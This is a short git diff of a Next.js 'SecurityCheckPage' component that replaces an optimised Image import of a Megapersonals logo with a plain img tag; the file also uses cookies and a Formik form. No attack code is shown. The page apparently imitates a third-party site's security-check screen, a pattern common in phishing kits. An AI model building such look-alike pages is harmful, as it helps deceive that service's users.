@@ -1,6 +1,5 @@
 "use client"
-import Image from "next/image";
-import Megapersonals from "../../public/images/megapersonals.png";
+
 import Cookies from "js-cookie";
 import { useState } from "react";
 import { Field, Form, Formik } from "formik";
@@ -53,7 +52,7 @@ function SecurityCheckPage() {
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
       <div className="w-[65%] lg:w-full">
-        <Image src={Megapersonals} alt="megaeprsonals" priority />
+        <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
       </div>
 
       <div className="mt-5 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-xl text-center font-medium uppercase">
